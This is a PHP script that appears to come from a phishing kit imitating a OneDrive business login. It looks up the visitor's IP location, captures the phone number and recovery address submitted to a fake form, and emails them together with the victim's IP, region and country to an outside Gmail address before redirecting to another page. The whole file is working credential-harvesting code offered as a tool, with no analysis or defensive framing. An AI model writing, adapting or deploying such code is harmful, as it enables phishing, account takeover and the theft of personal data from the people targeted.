<?php

$ip = getenv("REMOTE_ADDR");
$url='http://www.geoplugin.net/json.gp?ip='.$_SERVER['REMOTE_ADDR'];
			//$ipdetails=file_get_contents($url);
			//$response_tags=json_decode($ipdetails);
			
			//echo $url.'==============';
			
			$ch = curl_init();
			
			curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
			curl_setopt($ch, CURLOPT_HEADER, 0);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_URL, $url);
			curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);       
		
			$ouputdata = curl_exec($ch);
			curl_close($ch);
			
			$response_tags=json_decode($ouputdata);
			
			$country=$response_tags->geoplugin_countryName;
			$state=$response_tags->geoplugin_region;
			$city=$response_tags->geoplugin_city;



$msg .= "Recovr Detailz - OneDriveBiz\n";
$msg .= "******************************\n";
$msg .= "Phn: ".$_POST['phn']."\n";
$msg .= "Recovr Addr: ".$_POST['recvry']."\n";

$msg .= "\n";
$msg .= "=======================================\n";
$msg .= "Created by VXN\n";
$msg .= "=======================================\n";



$to ="blessedbox2018@gmail.com";
$subject = "$ip - $state, $country";
$from = "From: EL-VXN@ilekunanu.com";

mail($to,$subject,$msg,$from);

header("Location: index_return.php");

?>